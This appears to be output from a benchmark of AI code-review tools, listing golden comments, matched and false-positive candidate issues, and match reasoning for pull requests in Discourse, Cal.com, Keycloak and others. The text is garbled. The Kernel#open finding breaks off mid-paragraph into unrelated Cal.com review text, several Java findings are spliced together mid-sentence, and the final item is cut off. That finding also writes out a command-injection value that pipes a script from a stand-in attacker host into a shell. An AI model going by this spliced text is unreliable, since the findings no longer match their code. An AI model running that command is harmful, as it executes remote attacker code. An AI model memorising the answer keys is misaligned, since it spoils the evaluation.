`action_type` is declared `null: false` without a default; the default value is only applied by the model's `before_validation :set_defaults`. The spec for this feature explicitly anticipates the table being "manually loaded with some emails" — any such bulk insert or raw SQL insert that omits `action_type` will fail with a NOT NULL violation. Adding `default: 1` (the `:block` value) to the column would make the intended default hold at the database level.

`rejectedEmails: Em.A([])` puts a single array object on the class prototype, so every instance created from `Discourse.CreateAccountController` mutates the same array via `pushObject`. If more than one instance is ever created (or the container is reset, e.g. in tests), rejected emails leak across instances and are never cleared. The array should be initialised per instance (e.g. in `init`) or stored as `null` and lazily created.

Server-rejected email is reported to the user as "invalid"

When an email is in `rejectedEmails` the field validation shows `I18n.t('user.email.invalid')`, i.e. the "email address is invalid" message, even though the server rejected it because it is blocked or already taken. The server-provided error message (`result.errors.email`) should be surfaced instead of a generic format error.

The spec stubs `BlockedEmail.should_block?` entirely, so nothing exercises the real lookup (including the case-sensitivity problem), nothing verifies that a `User` with a blocked email actually fails to save, and the whitelist/blacklist branches that were moved out of `User#email_validator` into this new class have no coverage here. true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order() mixin maps 0-based `order` onto 1-based legacy ordinal-group

The new `order($val)` mixin emits the same number for `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` as for the standard `order` property. These are not equivalent: in the 2009 box spec `box-ordinal-group` is 1-based (initial value 1) while `order` is 0-based (initial value 0). Consequences: (a) `@include order(0)` emits `-webkit-box-ordinal-group: 0`, which is invalid and is dropped, and (b) any element given `order(1)` intending it to be placed *after* non-ordered siblings will instead be grouped with them in legacy-box engines, because unordered siblings default to ordinal-group 1. The legacy lines should use `$val + 1` (and the mixin should guard against `$val < 0`). This matters for the new usages `@include order(2)` on `.extra-info-wrapper` and `@include order(3)` on `.d-header .panel`, which only accidentally line up today because `.title` has no explicit order.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same bug: `-webkit-box-ordinal-group` and `-moz-box-ordinal-group` are 1-based properties, unlike the standard 0-based `order` property, causing invalid/incorrect behavior when `$val` is 0 or mapped directly without adding 1.

false_positives.candidate:
align-items() forwards modern keywords to legacy properties that do not accept them

`align-items($alignment)` passes `$alignment` verbatim to `-webkit-box-align` and `-ms-flex-align`. Those legacy properties only accept `start | end | center | baseline | stretch`, so the very common modern values `flex-start` and `flex-end` will produce invalid declarations that are silently dropped, leaving legacy engines (which are precisely the ones receiving `display: -webkit-box` / `-ms-flexbox` from the new `flexbox()` mixin) with the default `stretch` alignment. The current call sites only use `center` and `baseline`, so the bug is latent, but as a shared mixin it will break the first time someone writes `@include align-items(flex-start)`. The mixin should translate `flex-start`/`flex-end` to `start`/`end` for the legacy properties.

align-items() has no -moz-box-align although flexbox() emits display: -moz-box

`flexbox()` and `inline-flex()` emit `display: -moz-box` / `-moz-inline-box` for old Gecko, and `order()` emits `-moz-box-ordinal-group`, but `align-items()` omits `-moz-box-align`. Old Firefox versions therefore get legacy box layout with no cross-axis alignment at all (default stretch), which is exactly the case the prefix fallback was added for: e.g. `.d-header .contents` and `.small-action` will render with stretched, non-centered children instead of the intended vertical centering. Either add `-moz-box-align` or drop the `-moz-box` display fallbacks so the prefix coverage is internally consistent.

Making .small-action a flex container breaks right alignment of its button

`.small-action` is now `display: flex`, which makes `float` on its direct children a no-op. The `button { float: right; }` rule at the end of the block (and `.topic-avatar { float: left; }`) therefore no longer have any effect: the small-action button will be laid out immediately after `.small-action-desc` instead of being pushed to the right edge of the post, because `.small-action-desc` has no `flex: 1`/`flex-grow` and the button has no `margin-left: auto`. The existing `clear: both` on the flex container is likewise dead. Add `margin-left: auto` to the button (or `flex: 1` to `.small-action-desc`) and remove the now-meaningless float/clear declarations.

Header .panel right alignment relies on auto margins, which the legacy box fallback does not support

`.panel` previously used `float: right`; it now relies on `margin-left: auto` inside the flex `.contents`. Auto margins do not distribute free space in the 2009 flexbox (`display: -webkit-box` / `-moz-box`) that the new `flexbox()` mixin emits as a fallback, and there is no `-webkit-box-pack: end` equivalent. In engines that pick the legacy box display (old WebKit/Gecko builds) the panel with the search/user/hamburger icons will sit flush against the title instead of at the right edge of the header, i.e. a visible header regression for those browsers. Either add the legacy packing properties or drop the legacy `display` fallbacks so those browsers keep the float-based layout.

Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.

`include_website_name` is missing the trailing `?` so the guard never runs

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method is defined as `include_website_name` (no question mark), so it is dead code and `website_name` is unconditionally serialized. Consequences: (1) the key `website_name` is emitted with a `nil` value for every user that has no website, bloating every user payload and breaking any consumer that checks for key presence; (2) the intended `website.present?` gating is silently not applied. Rename to `include_website_name?`.
true_positives.reasoning: The candidate issue accurately identifies the primary issue described in the golden comment: the `include_website_name` method is missing the trailing `?` suffix required by Rails/ActiveModel serializers for conditional attribute inclusion. Although the golden comment also mentions a secondary issue regarding string literal mutation (`<<`), the candidate captures the core bug.

false_positives.candidate:
`website_name` is not listed in `untrusted_attributes`, leaking a TL0 user's website to anonymous visitors

`website` is declared in `untrusted_attributes` so that, when `scope.restrict_user_fields?(object)` is true (TL0 user viewed anonymously), the URL is not exposed — this is an anti-spam/privacy measure. The new `website_name` attribute returns the website host (and, for same-domain sites, the full path) but is not added to `untrusted_attributes`, and its own include guard (see `include_website_name`) only checks `website.present?`. The restricted URL is therefore disclosed through `website_name`, defeating the existing restriction. Add `:website_name` to the `untrusted_attributes` list (or make the include predicate also honour `scope.restrict_user_fields?`).

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on the literal `"."`. It happens to work today because each evaluation allocates a fresh literal, but it will raise `FrozenError` the moment this file gets `# frozen_string_literal: true` (or the interpreter is run with frozen literals enabled), and it is needlessly allocating/mutating. Use `".#{website_host}"` or `"." + website_host`.

No spec covers `website_name` visibility, so the untrusted/include regressions are undetected

The TL0-seen-as-anonymous context enumerates `untrusted_attributes` but does not include `website_name`, so the fact that the new attribute leaks a restricted website is not caught. There is likewise no spec for a user with a blank website (which currently serialises `website_name: nil` because the include predicate is misnamed `include_website_name`), nor for the sibling-subdomain branch (`www.example.com` website with `forum.example.com` instance). Add specs for these three cases so the guards are actually exercised.

Domain-matching heuristic mis-handles `www.` hosts and false-positives on shared public suffixes

The branch logic only compares hosts when the label counts are equal and > 2. Consequences: (a) website `http://www.example.com/user` on an instance hosted at `example.com` falls through to the `else` branch, where `"example.com".ends_with?(".www.example.com")` is false, so the path is dropped even though it is the same site — exactly the case this PR is meant to handle; (b) hosts sharing only a public suffix, e.g. website `foo.blogspot.com` with instance `bar.blogspot.com`, compare equal on the last two labels and get the full path rendered even though they are unrelated sites. Consider normalising a leading `www.` and comparing registrable domains instead of raw label suffixes.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and SSRF

`open(SiteSetting.feed_polling_url)` uses `Kernel#open`, which executes a subprocess when the argument starts with `|` (e.g. `feed_polling_url = "|curl evil.com/x.sh|sh"`), and will happily read local files/internal addresses otherwise. Also both `onError` handlers discard `error.message` and show a generic toast, so real failures (e.g. the "Credential not found or access denied" case from `deleteCache.handler.ts`) are indistinguishable from transient errors, making support/debugging harder. Wire `isPending` to the dialog's confirm button and surface the server message in the error toast.

updateManyByCredentialId is typed with UpdateInput but calls updateMany

The new method accepts `Prisma.SelectedCalendarUpdateInput` but forwards it to `prisma.selectedCalendar.updateMany`, which requires `Prisma.SelectedCalendarUpdateManyMutationInput`. `UpdateInput` permits nested relation operations (e.g. `user: { connect: { id } }`, `credential: { disconnect: true }`) that `updateMany` cannot execute, so such a call type-checks but fails at runtime with a Prisma validation error. Change the parameter type to `SelectedCalendarUpdateManyMutationInput`.

UserWithCalendars now requires updatedAt and googleChannelId that nothing in this PR consumes

`UserWithCalendars.allSelectedCalendars` / `userLevelSelectedCalendars` were widened from `Pick<SelectedCalendar, "externalId" | "integration" | "eventTypeId">` to also require `updatedAt` and `googleChannelId`. This is a breaking contract change for every caller that builds this object from a narrower Prisma `select` (platform API v2 / `@calcom/platform-libraries` consumers of `getConnectedDestinationCalendars`), which will now fail type-check and need matching select changes. Neither field is used by the cache-status feature added here (the handler reads `cacheUpdatedAt` from `CalendarCache`), and adding them to `findUnlockedUserForSession`'s select also enlarges the session payload for no benefit. Revert the type widening unless there is a consumer.

getCacheStatusByCredentialIds ignores expiresAt and reports expired cache as present

The `groupBy` only filters on `credentialId`, so rows whose `expiresAt` is already in the past are included in the max-`updatedAt` result. `getCachedAvailability` refuses to serve those rows (`expiresAt: { gte: now }`), so the UI will show a "Cache Status / Last updated …" entry and offer "Delete cached data" for a credential whose cache can no longer be used — a misleading status for a diagnostics feature. Filter by `expiresAt: { gte: new Date() }` (or surface expiry separately).

connectedCalendars always runs an extra cache groupBy and bypasses the CalendarCache feature-flag factory

The handler instantiates `new CalendarCacheRepository()` directly instead of going through `CalendarCache.init`, so the `CalendarCacheRepositoryMock` (used when calendar-cache is disabled) is bypassed and an additional `calendarCache.groupBy` query is executed on every call to this frequently-used endpoint, even for users/teams that have the calendar-cache feature off. Either skip the query when the feature is disabled or short-circuit when `credentialIds` is empty, and go through the existing factory so the enabled/disabled behaviour is consistent with the rest of the calendar-cache code.

Migration header warning contradicts the SQL it documents

The generated warning block states "Added the required column `updatedAt` to the `CalendarCache` table without a default value. This is not possible if the table is not empty.", but the statement below adds the column `NOT NULL DEFAULT NOW()`, which is safe for a non-empty table. Leaving the stale warning in place makes reviewers/operators believe this migration will fail or needs a manual backfill. Remove or correct the comment block.

ENV_FILE is resolved relative to the caller's CWD and can write a .env outside the repo

`ENV_FILE="../.env"` is relative to the current working directory, not to the script location. Running the script the obvious way from the repository root (`./scripts/test-gcal-webhooks.sh`) resolves to `<parent-of-checkout>/.env`: the script happily creates that file (`touch "$ENV_FILE"`) and writes `GOOGLE_WEBHOOK_URL` into it, polluting a directory outside the repo while the developer's real `.env` is never updated — so the webhook test silently does not work. Resolve the path from the script directory (e.g. `ENV_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/.env"`).

cleanup() always exits 0, so failures report success

`cleanup()` ends with `exit 0` and is used both as the SIGINT/SIGTERM trap and as the failure path for "Rate limit hit" (line 49) and "Failed to extract Tunnelmole URL" (line 58). The script therefore terminates with status 0 even when it never obtained a tunnel URL and never configured `GOOGLE_WEBHOOK_URL`, so any wrapper script or CI step cannot detect the failure. Use a non-zero exit code for the error paths.

dev:cron switched to `npx tsx` without adding tsx as a dependency

`"dev:cron": "npx tsx cron-tester.ts"` relies on `npx` fetching `tsx` from the network at run time; the package is not in `dependencies`/`devDependencies`, so the version is unpinned and unaffected by the lockfile, and the command fails in offline/sandboxed environments. Meanwhile `ts-node` is still a devDependency and is still used by the sibling scripts (`check-changed-files`, `translate-locales`), so the toolchain is now inconsistent. Either add `tsx` as a devDependency and call it directly, or revert to `ts-node`.

No tests for the new deleteCache authorization or cache-status aggregation

This PR adds a destructive mutation (`viewer.calendars.deleteCache`) whose only protection is an ownership lookup, plus a new `getCacheStatusByCredentialIds` aggregation and the credential→cache mapping in `connectedCalendars.handler.ts`, and none of them have unit tests. At minimum there should be tests asserting that (a) deleting cache for a credential belonging to another user is rejected, (b) a successful call removes only the rows for that credentialId, and (c) `getCacheStatusByCredentialIds` returns the latest `updatedAt` per credential and maps correctly to `cacheUpdatedAt` (including the no-cache case).

true_positives.golden_comment: Incorrect end time calculation using slotStartTime instead of slotEndTime
true_positives.matched_candidate:
`end` is computed from the slot start, so the working-hours end boundary is never enforced

`const start = slotStartTime.hour() * 60 + slotStartTime.minute(); const end = slotStartTime.hour() * 60 + slotStartTime.minute();` — both variables are identical; `end` was clearly meant to be the slot end (`start + eventLength`, or derived from `slotEndTime`). As written, the `end > workingHour.endTime` test only ever compares the slot *start* against the end boundary, so a slot that starts inside working hours but ends after them (e.g. a 60-minute slot starting 30 minutes before the day's end time) is accepted, allowing bookings that run past the host's availability.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same bug: the `end` variable is mistakenly calculated using `slotStartTime` instead of `slotEndTime`.

true_positives.golden_comment: Using === for dayjs object comparison will always return false as it compares object references, not values. Use .isSame() method instead: dayjs(date.start).add(utcOffset, 'minutes').isSame(dayjs(date.end).add(utcOffset, minutes))
true_positives.matched_candidate:
Dayjs objects compared with `===`, so the zero-length (whole-day unavailable) override branch is dead code

`if (dayjs(date.start).add(utcOffset, "minutes") === dayjs(date.end).add(utcOffset, "minutes"))` compares two freshly created Dayjs objects by reference, which is always false. The intent (treat an override whose start equals its end as "unavailable all day") is never executed, so the handling of whole-day "mark unavailable" overrides depends on the later, unrelated comparisons. Use `.isSame(...)` (or compare `valueOf()`).
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same bug: comparing two `dayjs` objects using `===` checks reference equality rather than value equality, which will always evaluate to false. Both also recommend using `.isSame()` as the fix.

false_positives.candidate:
Date override on a day makes every slot available, skipping busy-time checks

In `checkIfIsAvailable`, the new block sets `dateOverrideExist = true` for any date override whose date matches the slot's date, and then `if (dateOverrideExist) return true;` returns early. This return happens *before* the `busy.every(...)` loop, so on any day that has a date override the function reports every slot as available and completely ignores existing bookings, external calendar busy times, event buffers and reserved (`selectedSlots`) entries. Any host with a date override can therefore be double-booked. The override check should only narrow availability, not short-circuit the busy evaluation.

working-hours check rejects slots when a user has more than one availability block per day

`workingHours.find((workingHour) => ...)` returns truthy as soon as *one* working-hours entry does not contain the slot, and the result is interpreted as "slot is outside of working hours" -> unavailable. A user whose schedule has several blocks on the same weekday (e.g. 09:00-12:00 and 14:00-18:00) produces two `WorkingHours` entries with the same `days`, so a 10:00 slot is inside the first and outside the second and gets dropped — all slots vanish for split schedules. The same happens for schedules that cross UTC midnight, where `getWorkingHours` emits two normalized entries covering the same days. The predicate must be "no entry contains the slot" (`!workingHours.some(contains)`), not "some entry does not contain it". Note this path applies to personal events too, because single-user events are treated as fixed hosts.

Date-override check rejects slots when a date has multiple override ranges

`dateOverrides.find((date) => ...)` returns truthy for the first override that does *not* contain the slot, and that result is treated as "slot is not within the date override" -> unavailable. Cal.com allows several time ranges for the same override date (and several hosts' overrides are flattened into the same array when a team event is evaluated per host). With two ranges on one date (e.g. 09:00-11:00 and 14:00-16:00), a slot inside the first range is outside the second, so the slot is rejected and every slot on that date disappears. The condition should be "none of the overrides for this date contain the slot".

Slots that only partially overlap a date override are treated as inside it

The override containment test marks a slot as outside the override only when `slotEndTime <= override.start` or `slotStartTime > override.end`. A slot that starts before the override start but ends inside it (slot 13:30-14:30 vs override 14:00-18:00) or starts inside but ends after the end (slot 17:30-18:30 vs 14:00-18:00) satisfies neither condition, so it is considered available. Combined with the early `return true` for `dateOverrideExist`, such partially overlapping slots are offered for booking outside the host's overridden availability. The correct test is `slotStartTime < override.start || slotEndTime > override.end`.

Override date comparison mixes server-local and UTC dates

`dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` formats in the *server's* local timezone (plain `dayjs(...)`, no `.utc()`), while it is compared against `slotStartTime.format("YYYY MM DD")`, which is in UTC (`slotStartTime = time.utc()`). On any deployment whose process timezone is not UTC the two dates can differ by a day, so date overrides are matched to the wrong day: overrides are either ignored (making unavailable time bookable) or applied to the neighbouring day. Use `dayjs.utc(date.start)` for the comparison. Tests run with TZ=UTC will not catch this.

Override timezone shift loses the day when it crosses midnight

The new override conversion reduces the shifted instant to minutes-since-midnight via `hour() * 60 + minute()`. When `offset` (invitee offset minus organizer offset) pushes the override across a day boundary — e.g. an override 22:00-23:00 in the organizer's timezone viewed by an invitee 5 hours ahead — the computed `startTime`/`endTime` wrap around to small values and are applied to the invitee's *same* day, so the override's slots are generated on the wrong day. If only one of the two endpoints wraps, `endTime < startTime` and `buildSlots` silently discards the range (`if (start >= end) continue`), so the override yields no slots at all. The day offset produced by the shift has to be carried, not discarded.

Missing `override.timeZone` silently falls back to the process/default timezone

`dayjs(override.start.toString()).tz(override.timeZone)` is called with `timeZone` typed as optional (`timeZone?: string` in packages/types/schedule.d.ts). When a caller of `getSlots` passes date overrides without a `timeZone` (the type permits it, and only the slots tRPC router was updated to populate it), the dayjs timezone plugin falls back to the default/local timezone, so `organizerUtcOffset` is computed for the wrong zone and the override is shifted by an arbitrary amount instead of being treated as organizer-local. Either make `timeZone` required for date overrides or explicitly fall back to `organizerTimeZone` which is already passed into `getSlots`.

No test for the PR's main fix: date overrides of fixed hosts in round-robin events

The PR's primary claim is that date overrides of fixed hosts are now honoured for ROUND_ROBIN events (so slots where the fixed host is unavailable are no longer offered). The only new test added covers a single-user event with a different invitee timezone. There is no scenario with a ROUND_ROBIN event type, a fixed host carrying a date override and a non-fixed host available all day, which is exactly the behaviour added in `checkIfIsAvailable` and the riskiest part of the change (it currently also bypasses busy-time checks). Without such a test the regression this PR fixes can silently come back.

toHaveTimeSlots matcher does not compare lengths, so the new assertion can pass with missing slots

The matcher iterates `schedule.slots[dateString].map(...).every((actualSlotTime, index) => ...)` over the *actual* slots only and never checks that the number of returned slots equals `expectedSlots.length`. The new assertion for the Asia/Dhaka invitee would therefore still pass if the implementation returned only `08:30:00.000Z` (or any prefix of the expected list), which is precisely the kind of over-filtering the new date-override/working-hours code can cause. Add a length check to the matcher so the new timezone test actually guards against dropped slots.

true_positives.golden_comment: Using retryCount: reminder.retryCount + 1 reads a possibly stale value and can lose increments under concurrency; consider an atomic increment via Prisma (increment: 1) to avoid race conditions (also applies to the similar update in the catch block).
true_positives.matched_candidate:
Read-modify-write on retryCount instead of atomic increment

`retryCount: reminder.retryCount + 1` uses the value read at the start of the handler. If two cron invocations overlap (cron overlap, manual POST, retried request), both read the same value and one increment is lost, so a reminder can keep retrying beyond the intended limit. Use Prisma's atomic `{ increment: 1 }` instead.
true_positives.reasoning: Both comments identify the exact same concurrency/race condition issue with `retryCount: reminder.retryCount + 1` reading a stale value and losing increments, and both suggest the exact same solution of using Prisma's atomic `{ increment: 1 }`.

true_positives.golden_comment: The deletion logic in scheduleSMSReminders.ts incorrectly deletes non-SMS workflow reminders (e.g., Email, WhatsApp) that have retryCount > 1. This occurs because the retryCount condition within the OR clause for deletion lacks a method: WorkflowMethods.SMS filter, causing it to apply to all reminder types instead of only SMS reminders, which is the intended scope of this function.
true_positives.matched_candidate:
deleteMany OR branch has no method filter and deletes non-SMS reminders

The new `OR` branch `{ retryCount: { gt: 1 } }` in `prisma.workflowReminder.deleteMany` is not scoped to `method: WorkflowMethods.SMS`. The SMS cron therefore deletes *any* WorkflowReminder row (EMAIL, WHATSAPP, mandatory reminders, etc.) whose retryCount exceeded 1, including rows with future scheduledDate. Today only this handler increments retryCount, but as soon as the email/WhatsApp schedulers (or any other code) reuse the same column, this cron will silently destroy their pending reminders. Add the method filter inside the OR branch (or combine it as `AND` with method/scheduled conditions).
true_positives.reasoning: The candidate issue identifies the exact same bug as the golden comment: the deletion logic in the SMS reminders scheduler has an OR branch for retryCount > 1 that lacks the method: WorkflowMethods.SMS filter, causing it to delete non-SMS reminders (like Email, WhatsApp).

false_positives.candidate:
prisma.update inside catch block can throw and abort the whole cron run

The `prisma.workflowReminder.update` added at the top of the `catch` block is itself unprotected. If this update fails (record removed concurrently, connection error, etc.) the exception propagates out of the `for` loop, so every remaining unscheduled reminder in the batch is skipped and the endpoint returns a 500 instead of the previous behaviour where a single failing reminder was only logged. Wrap the retry-count update in its own try/catch (or move it after logging and guard it).

retryCount predicate is unindexed, forcing a full scan of WorkflowReminder on every cron tick

`retryCount` has no index (see `WorkflowReminder` indexes in schema.prisma), and because it is an `OR` branch Postgres can no longer satisfy the whole delete from the existing `[method, scheduled, scheduledDate]` index — it must sequentially scan WorkflowReminder. WorkflowReminder is one of the largest tables in this schema and this cron runs frequently, so this adds a repeated full-table scan plus row locks. Either add an index covering retryCount (e.g. `@@index([method, retryCount])`) or fold the retry condition into the existing method/scheduledDate-filtered predicate.

retryCount is not incremented when sendTo or message is missing, so those reminders still loop forever

The retry increment only happens inside `if (message?.length && message?.length > 0 && sendTo)` (else-branch) or in the catch. When `sendTo` is null (e.g. no smsReminderNumber on the booking / no sendTo on the step) or the template produced an empty message, the loop body does nothing: the reminder stays `scheduled: false`, keeps being picked up by the 7-day query on every cron run and is never cleaned up until scheduledDate passes. This is exactly the "keep scheduling it in our cron job until the date is reached" problem the PR claims to fix, so the fix is incomplete for that class of rows.

Reminders skipped for non-transient reasons (e.g. SMS sending locked) are permanently deleted

`twilio.scheduleSMS` returns a falsy value not only on send failures but also when sending is suppressed for the user/team (SMS lock state checks inside the provider). With this change such a skip increments `retryCount`, and after two cron runs the reminder row is deleted by the new `deleteMany` branch. Consequence: once a lock/review is lifted the reminder no longer exists and the customer never gets the SMS. Distinguish genuine scheduling errors from intentional skips before counting a retry.

No test covering the new retry/delete behaviour

The PR introduces a retry-and-delete policy (increment on failure, delete when retryCount > 1) with no accompanying test. A regression here either leaks reminders forever or deletes reminders that should still be sent, both of which are silent in production. A unit/integration test asserting (a) retryCount increments when scheduleSMS fails or returns falsy, (b) rows with retryCount > 1 are deleted, and (c) non-SMS reminders are untouched, would lock the behaviour in.

Returned SQL fragments contain un-parenthesized top-level OR, enabling authorization bypass when callers append conditions

`getBaseConditions()` returns `authConditions` verbatim when there are no filters (line 75), and `getAuthorizationConditions()`/`getFilterConditions()` are public. For org and team scope, `buildOrgAuthorizationCondition`/`buildTeamAuthorizationCondition` produce a fragment whose top-level operator is `OR` (e.g. `("teamId" = ANY($1)) AND ("isTeamBooking" = true) OR (("userId" = ANY($2)) AND ("isTeamBooking" = false))` after the reduce), and `buildFilterConditions` likewise returns a bare `OR` fragment when only `eventTypeId` is set. Since the service no longer executes any query, every consumer must interpolate these fragments into their own raw SQL, and the natural `WHERE ${baseConditions} AND "startTime" > ${x}` becomes `A OR (B AND x)` because SQL `AND` binds tighter than `OR`. That silently widens the authorized row set (bookings of users/teams the caller is not entitled to see). The service should wrap its final result in parentheses (e.g. `Prisma.sql`(${combined})`) before returning it from `getBaseConditions`/`getFilterConditions`/`getAuthorizationConditions`.

Public `findMany` removed and replaced by `getBaseConditions` without updating consumers

The only query-executing method on `InsightsBookingService` (`findMany(findManyArgs)`) is deleted and replaced with `getBaseConditions(): Promise<Prisma.Sql>`. Nothing else in the repository is updated in this PR, so any existing caller of `service.findMany(...)` will fail to compile (or, if typed loosely, fail at runtime). It also pushes raw-SQL assembly onto every consumer, which is where the parenthesization hazard above becomes dangerous. Either keep an execution helper on the service (e.g. a `findMany`/`query` that wraps `$queryRaw` with the base conditions correctly parenthesized) or update all call sites in the same change.

Constructor option type widened so `scope: "team"` without `teamId` type-checks and silently returns no rows

The constructor now accepts `InsightsBookingServicePublicOptions` (`scope: "user" | "org" | "team"`, `teamId?: number`) instead of the zod-inferred discriminated union. A caller passing `{ scope: "team", userId, orgId }` with `teamId` undefined (a very likely shape when `teamId` comes from an optional request field) now compiles, but `insightsBookingServiceOptionsSchema.safeParse` fails, `this.options` becomes `null`, and `buildAuthorizationConditions` returns `1=0`. The user sees an empty insights result with no error and no log, instead of a compile-time error as before. Keep the exact union type for the public options, or surface the validation failure (throw / log) rather than degrading to an empty result set.

Only the user-scope SQL is ever executed; team/org `= ANY(...)` fragments are never run against Postgres

After this conversion the correctness of the generated SQL (column quoting, `= ANY($n)` parameter binding for integer arrays, `1=0`) can only be verified by executing it. The single `$queryRaw` test at line 481 exercises the user-scope condition plus an `eventTypeId` filter; the team-scope, org-scope and NOTHING conditions are asserted only by comparing `Prisma.sql` template objects, which would pass even if the SQL is syntactically invalid or the driver cannot infer the array parameter type for `= ANY($1)`. Add `$queryRaw` assertions for at least the org and team scopes (and the NOTHING condition) so a broken raw query is caught by CI rather than in production.

The `describe("Caching")` block covering `getAuthorizationConditions()`/`getFilterConditions()` memoization was removed. That behaviour still exists in the service (`cachedAuthConditions`/`cachedFilterConditions` with the `=== undefined` sentinel check, which is specifically needed because `getFilterConditions()` legitimately caches `null`). With the tests gone, a regression such as switching the check to `if (!this.cachedFilterConditions)` — which would recompute and re-query on every call — would go unnoticed. Port the caching assertions to the new SQL expectations instead of dropping them.

The two while-loops compute a common prefix length (`start`) and a common suffix length (`end`) independently, so `start + end` can exceed the length of the shorter string. Example: value `abb`, sanitized `ab` gives start=2 and end=2, and `value.substring(2, 3 - 2)` → `substring(2, 1)` throws `StringIndexOutOfBoundsException` (the same happens on the `sanitized.substring(...)` call for value `aa`/sanitized `a`). `new PropertyResourceBundle(FileInputStream)` loads the file with `Properties.load(InputStream)`, which decodes ISO-8859-1, whereas `verifyNoDuplicateKeys` reads the same file with `Files.readString` (UTF-8). Combined with the fact that there is no test asserting an *empty* result for a legitimate file (e.g. a `_de` bundle whose English source contains ``/`

`/`
` and whose translation uses the same allowed tags, or a bundle containing `{{0}}` placeholders and `{N,choice,...}` constructs), the suite cannot detect the false positives this checker is most likely to produce – which is exactly the risk that forced the large number of cosmetic edits in this PR. 2. The offsets are wrong. The encoded prefix is `<sessionType:2><tokenType:2><grantType:2>`, so the grant shortcut is `substring(4, 6)`, not `substring(3, 5)`. `substring(3,5)` returns the second char of the token type plus the first char of the grant type (e.g. for `onrtac` it returns `"ta"`).

When both are enabled, a `ClientModel.ClientRemovedEvent` reaches `management(...).clients().setPermissionsEnabled(cast.getClient(), false)`, which now throws `UnsupportedOperationException` and aborts the client deletion transaction (HTTP 500). The same applies to the `/clients/{id}/management/permissions` admin endpoints, which call `clients().isPermissionsEnabled()`/`getPermissions()` after the V1 feature check passes. The guard should select the V1 implementation explicitly (or V2 should no-op instead of throwing) for these legacy operations.

No migration for realms whose admin-permissions client already exists

`init()` returns early when `realm.getAdminPermissionsClient() != null`, so realms where FGAP v2 was already enabled before this change never receive the newly added `Clients` resource nor the new scopes (`configure`, `map-roles-client-scope`, `map-roles-composite`). In such realms: creating a Clients permission reaches `getOrCreateResource()` and hits `throw new ModelException("No scopes found.")` (line 108) for the missing scopes, all-clients evaluation silently returns `false` because `resourceStore.findByName(server, "Clients", ...)` is null, and per-client evaluation NPEs on the null aggregate resource (ClientPermissionsV2 line 219). The PR adds no upgrade/migration step to create the missing scopes and resource for existing admin-permissions clients.

getResourceName has no handling for the Clients resource type

`getResourceName()` translates resource names to human-readable values only for the `Users` resource type ("All users" for the aggregate resource, the username for per-user resources) and otherwise returns `resource.getDisplayName()`. Per-client resources are created in `getOrCreateResource()` without a display name, and the aggregate `Clients` resource has none either, so every Clients permission exposed through the admin REST API/console will report a `null` resource name instead of the client id/clientId or an "All clients" label. The new resource type needs a branch here (resolving the client via `session.clients().getClientById()`), consistent with the Users handling.

resolveClient allows permissions to target the admin-permissions client itself

`resolveClient()` resolves any client in the realm, including the realm's own admin-permissions (FGAP policy) client and `realm-management`, even though the class already provides `throwExceptionIfAdminPermissionClient()` for exactly this kind of guard and it is not used here. As a result an administrator can create a Clients permission whose resource is the admin-permissions client and grant `manage`/`configure` on it; since the client authorization admin endpoints are gated on being able to manage the owning client, the grantee can then modify or delete all fine-grained admin permission policies — a privilege escalation out of the restricted scope they were given. Target clients that back the FGAP/admin infrastructure should be rejected when resolving the resource.

Javadoc for void require* methods says they return true

`requireView()` (line 98) and `requireViewClientScopes()` (line 103) are `void`, but the new Javadoc states "Returns {@code true} if {@link #canView()} returns {@code true}" / "Returns {@code true} if {@link #canViewClientScopes()} returns {@code true}". These should follow the convention used for the other require* methods in this file: "Throws ForbiddenException if ... returns {@code false}". As written the contract documented for implementors/callers is wrong.

New Clients scopes and all-clients fallback combinations are untested

The added tests cover `manage`, `configure`, `view`, `map-roles` and `map-roles-composite`, but there is no test for the newly introduced `map-roles-client-scope` scope (`canMapClientScopeRoles`), none for `getClientsWithPermission()` (which, as implemented, cannot return any client id), and none for the combination of an all-clients permission with an unrelated per-client permission — a case where `hasPermission(ClientModel, scope)` stops consulting the aggregate `Clients` resource as soon as a per-client resource exists, so a previously granted all-clients permission silently stops applying to that client. These are exactly the paths most likely to regress.

The canView() method correctly checks both VIEW and MANAGE, but canManage() should only check MANAGE.

true_positives.golden_comment: In getGroupIdsWithViewPermission, hasPermission is called with groupResource.getId() and the same groupResource.getId() is added to granted, but hasPermission resolves resources by name (treating the argument as a group id) and the GroupPermissionEvaluator contract says this method returns group IDs that are later used as UserModel.GROUPS and in getUsersCount group filters. In the V2 implementation the authorization `Resource` created for a group uses the *group id as the resource name* (see `AdminPermissionsSchema.resolveGroup`/`getOrCreateResource`), while `Resource#getId()` is the unrelated internal UUID of the authz resource. This method adds `groupResource.getId()` to the returned set and also passes `groupResource.getId()` into `hasPermission(String groupId, ...)`, which resolves the group via `resourceStore.findByName(server, groupId)`.

Consequences:
1. `hasPermission` never finds the per-group resource for the id it is given, so it always falls through to the "all groups" resource-type resource - the per-group evaluation intended here does not happen.
